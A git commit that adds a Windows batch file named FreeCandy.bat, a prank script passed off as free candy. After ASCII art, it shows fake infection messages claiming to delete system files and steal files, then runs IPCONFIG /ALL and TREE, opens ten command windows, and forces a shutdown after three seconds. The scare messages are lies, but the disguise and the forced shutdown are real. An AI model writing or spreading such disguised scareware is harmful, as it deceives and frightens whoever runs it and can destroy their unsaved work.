4a1203a4234bccf9b0cf7398305af155dad82c21
creatorpanda <creatorpanda@users.noreply.github.com>
2017-06-03 19:23:59 +0300

    Add files via upload

---
+++ FreeCandy.bat
@@ -0,0 +1,83 @@
+@ECHO OFF 
+color 0a 
+TITLE CANDY! 
+REM emfanizo minimata
+ECHO                             ...----....
+ECHO                        ..-:"''         ''"-..
+ECHO                      .-'                      '-.
+ECHO                    .'              .     .       '.
+ECHO                  .'   .          .    .      .    .''.
+ECHO                .'  .    .       .   .   .     .   . ..:.
+ECHO              .' .   . .  .       .   .   ..  .   . ....::.
+ECHO             ..   .   .      .  .    .     .  ..  . ....:IA.
+ECHO            .:  .   .    .    .  .  .    .. .  .. .. ....:IA.
+ECHO           .: .   .   ..   .    .     . . .. . ... ....:.:VHA.
+ECHO           '..  .  .. .   .       .  . .. . .. . .....:.::IHHB.
+ECHO          .:. .  . .  . .   .  .  . . . ...:.:... .......:HIHMM.
+ECHO         .:.... .   . ."::"'.. .   .  . .:.:.:II;,. .. ..:IHIMMA
+ECHO         WHAT A NICE DAY!
+ECHO    OH LOOK! A GIANT MOUNTAIN OF CANDY !!!
+timeout /t 4 /nobreak >nul 
+ECHO         ':.:..  ..::IHHHHHI::. . .  ...:.::::.,,,. . ....VIMMHM
+ECHO        .:::I. .AHHHHHHHHHHAI::. .:...,:IIHHHHHHMMMHHL:. . VMMMM
+ECHO       .:.:V.:IVHHHHHHHMHMHHH::..:" .:HIHHHHHHHHHHHHHMHHA. .VMMM.
+ECHO       :..V.:IVHHHHHMMHHHHHHHB... . .:VPHHMHHHMMHHHHHHHHHAI.:VMMI
+ECHO       ::V..:VIHHHHHHMMMHHHHHH. .   .I":IIMHHMMHHHHHHHHHHHAPI:WMM
+ECHO       ::". .:.HHHHHHHHMMHHHHHI.  . .:..I:MHMMHHHHHHHHHMHV:':H:WM
+ECHO       :: . :.::IIHHHHHHMMHHHHV  .ABA.:.:IMHMHMMMHMHHHHV:'. .IHWW
+ECHO       '.  ..:..:.:IHHHHHMMHV" .AVMHMA.:.'VHMMMMHHHHHV:' .  :IHWV
+ECHO        :.  .:...:".:.:TPP"   .AVMMHMMA.:. "VMMHHHP.:... .. :IVAI
+ECHO       .:.   '... .:"'   .   ..HMMMHMMMA::. ."VHHI:::....  .:IHW'
+ECHO       ...  .  . ..:IIPPIH: ..HMMMI.MMMV:I:.  .:ILLH:.. ...:I:IM
+ECHO     : .   .'"' .:.V". .. .  :HMMM:IMMMI::I. ..:HHIIPPHI::'.P:HM.
+ECHO     :.  .  .  .. ..:.. .    :AMMM IMMMM..:...:IV":T::I::.".:IHIMA
+ECHO     'V:.. .. . .. .  .  .   'VMMV..VMMV :....:V:.:..:....::IHHHMH
+ECHO       "IHH:.II:.. .:. .  . . . " :HB"" . . ..PI:.::.:::..:IHHMMV"
+ECHO        :IP""HHII:.  .  .    . . .'V:. . . ..:IH:.:.::IHIHHMMMMM"
+ECHO        :V:. VIMA:I..  .     .  . .. . .  .:.I:I:..:IHHHHMMHHMMM
+ECHO        :"VI:.VWMA::. .:      .   .. .:. ..:.I::.:IVHHHMMMHMMMMI
+ECHO        :."VIIHHMMA:.  .   .   .:  .:.. . .:.II:I:AMMMMMMHMMMMMI
+ECHO        :..VIHIHMMMI...::.,:.,:!"I:!"I!"I!"V:AI:VAMMMMMMHMMMMMM'
+ECHO        ':.:HIHIMHHA:"!!"I.:AXXXVVXXXXXXXA:."HPHIMMMMHHMHMMMMMV
+ECHO          V:H:I:MA:W'I :AXXXIXII:IIIISSSSSSXXA.I.VMMMHMHMMMMMM
+ECHO            'I::IVA ASSSSXSSSSBBSBMBSSSSSSBBMMMBS.VVMMHIMM'"'
+ECHO             I:: VPAIMSSSSSSSSSBSSSMMBSSSBBMMMMXXI:MMHIMMI
+ECHO            .I::. "H:XIIXBBMMMMMMMMMMMMMMMMMBXIXXMMPHIIMM'
+ECHO            :::I.  ':XSSXXIIIIXSSBMBSSXXXIIIXXSMMAMI:.IMM
+ECHO            :::I:.  .VSSSSSISISISSSBII:ISSSSBMMB:MI:..:MM
+ECHO            ::.I:.  ':"SSSSSSSISISSXIIXSSSSBMMB:AHI:..MMM.
+ECHO            ::.I:. . ..:"BBSSSSSSSSSSSSBBBMMMB:AHHI::.HMMI
+ECHO            :..::.  . ..::":BBBBBSSBBBMMMB:MMMMHHII::IHHMI
+ECHO            ':.I:... ....:IHHHHHMMMMMMMMMMMMMMMHHIIIIHMMV"
+ECHO              "V:. ..:...:.IHHHMMMMMMMMMMMMMMMMHHHMHHMHP'
+ECHO               ':. .:::.:.::III::IHHHHMMMMMHMHMMHHHHM"
+ECHO                 "::....::.:::..:..::IIIIIHHHHMMMHHMV"
+ECHO                   "::.::.. .. .  ...:::IIHHMMMMHMV"
+ECHO                     "V::... . .I::IHHMMV"'
+ECHO                       '"VHVHHHAHHHHMMV:"'
+TITLE 1T W4S N0 C4NDY !!!
+ECHO IT NEVER WAS CANDY !!! (you remember me?)
+timeout /t 2 /nobreak >nul
+ECHO YOUR PC IS INFECTED!
+timeout /t 1 /nobreak >nul
+ECHO DELETING SYS32..
+timeout /t 2 /nobreak >nul
+ECHO STEALING FILES..
+timeout /t 3 /nobreak >nul
+ECHO DONE!
+timeout /t 1 /nobreak >nul
+TREE
+IPCONFIG /ALL 
+timeout /t 2 /nobreak >nul
+start cmd.exe 
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+start cmd.exe
+shutdown.exe /s /t 03
+timeout /t 1 /nobreak >nul
